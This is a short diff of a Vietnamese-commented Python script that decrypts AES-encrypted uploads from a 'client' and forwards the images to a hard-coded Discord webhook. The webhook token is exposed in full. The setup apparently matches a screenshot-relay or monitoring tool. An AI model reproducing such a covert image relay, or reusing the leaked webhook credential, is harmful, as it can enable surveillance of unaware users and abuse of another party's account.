@@ -13,18 +13,25 @@ os.makedirs(SAVE_FOLDER, exist_ok=True)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1379493184245207120/lm4Yy1mUQyVAlILh2RCxhHKauYyEmgycIEseWXwMf7uT8KufpBG6AmSxzvq5en5evsS8"
 
 def send_to_discord(filename, filepath):
+    if not os.path.exists(filepath):
+        print(f"[-] File không tồn tại: {filepath}")
+        return
+
     with open(filepath, "rb") as f:
-        files = {"file": (filename, f)}
-        payload = {"content": f"📸 Ảnh mới từ client `{filename}`"}
+        files = {"file": (filename, f, "image/png")}
+        data = {
+            "content": f"📸 Ảnh mới nhận: `{filename}`"
+        }
         try:
-            response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
+            response = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files)
+            print(f"[Discord] Status: {response.status_code}")
             if response.status_code == 204:
-                print(f"[+] Đã gửi ảnh tới Discord.")
+                print("[+] Ảnh đã gửi lên Discord.")
             else:
                 print(f"[-] Lỗi gửi Discord: {response.status_code} - {response.text}")
         except Exception as e:
-            print(f"[-] Gửi Discord thất bại: {e}")
-
+            print(f"[-] Lỗi khi gửi lên Discord: {e}")
+            
 def decrypt_aes(data, key):
     nonce = base64.b64decode(data['nonce'])
     tag = base64.b64decode(data['tag'])
